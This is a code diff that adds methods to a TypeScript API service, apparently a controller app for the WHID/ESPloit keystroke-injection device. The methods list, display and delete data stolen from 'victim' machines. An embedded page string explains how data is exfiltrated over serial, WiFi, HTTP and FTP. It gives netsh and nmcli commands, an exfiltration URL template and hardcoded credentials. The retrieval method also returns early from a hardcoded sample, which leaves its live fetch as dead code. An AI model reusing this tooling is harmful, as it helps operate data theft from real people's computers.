@@ -38,6 +38,47 @@ export class ApiService {
     })
   }
 
+  async displayExfiltratedData(uri: string) {
+    var tmpUrl = "http://" + this.whidIP + "/showpayload?payload=" + uri;
+    return this.http.get(tmpUrl, {}, {});
+  }
+
+  deleteExfiltratedPayload(uri: string) {
+    var tmpUrl = "http://" + this.whidIP + "/deletepayload/yes?payload=" + uri;
+    this.http.get(tmpUrl, {}, {});
+  }
+
+  retrieveExfiltratedData() {
+
+    var matches: RegExpExecArray;
+    var exfiltratedPayloads = [];
+
+    let str = '<a href="/esploit"><- BACK TO INDEX</a><br><br>To exfiltrate data using the serial method find the com port device is connected to<br>then be sure to set the baud rate to 38400 on the victim machine<br>and send the text "SerialEXFIL:" followed by the data to exfiltrate.<br>To exfiltrate data using the WiFi methods be sure ESPloit and Target machine are on the same network.<br>Either set ESPloit to join the Target\'s network or set the Target to join ESPloit\'s AP.<br><small>Current Network Configuration: ESPloit\'s IP= <b>192.168.1.1</b> SSID = <b>Exploit</b> PASSWORD = <b>DotAgency</b><br>Windows: netsh wlan set hostednetwork mode=allow ssid="<b>Exploit</b>" key="<b>DotAgency</b>"<br>Linux: nmcli dev wifi connect <b>Exploit</b> password <b>DotAgency</b></small><br>For HTTP exfiltration method point the target machine to the url listed below:<br><small>http://<b>192.168.1.1</b>/exfiltrate?file=<b>FILENAME.TXT</b>&data=<b>EXFILTRATED-DATA-HERE</b></small><br>For FTP exfiltration method use the credentials listed below:<br><small>Server: <b>192.168.1.1</b> Username: <b>ftp-admin</b> Password: <b>hacktheplanet</b></small><br>See the example payloads for more in depth examples.<br><br>File System Info Calculated in Bytes<br><b>Total:</b> 2949250 <b>Free:</b> 2947744  <b>Used:</b> 1506<br><br><table border=\'1\'><tr><td><b>Display File Contents</b></td><td><b>Size in Bytes</b></td><td><b>Download File</b></td><td><b>Delete File</b></td></tr>  <tr><td><a href="/showpayload?payload=/SerialEXFIL.txt">/SerialEXFIL.txt</a></td><td>18</td><td><a href="/SerialEXFIL.txt"><button>Download File</button></td><td><a href="/deletepayload?payload=/SerialEXFIL.txt"><button>Delete File</button></td></tr></table>';
+    const regexp = /href="\/showpayload\?payload\=(\/[a-zA-Z0-9\.]+)"/g;
+    while ((matches = regexp.exec(str)) !== null) {
+      console.log(matches)
+      console.log(`${matches[0]} trouvé. Prochaine recherche à partir de ${regexp.lastIndex}.`);
+      exfiltratedPayloads.push(matches[1]);
+    }
+    console.log(exfiltratedPayloads);
+
+    return exfiltratedPayloads;
+
+    var tmpUrl = "http://" + this.whidIP + "/exfiltrate/list";
+    this.http.get(tmpUrl, {}, {})
+    .then(res => {
+      console.log(res.data);
+      const regexp = /href="\/showpayload\?payload\=(\/[a-zA-Z0-9\.]+)"/g;
+      while ((matches = regexp.exec(res.data)) !== null) {
+        console.log(matches)
+        console.log(`${matches[0]} trouvé. Prochaine recherche à partir de ${regexp.lastIndex}.`);
+        exfiltratedPayloads.push(matches[1]);
+      }
+      console.log(exfiltratedPayloads);
+      return exfiltratedPayloads;
+    })
+  }
+
   reboot() {
     var tmpUrl = "http://" + this.whidIP + "/reboot";
     this.http.get(tmpUrl, {}, {}).then(() => {
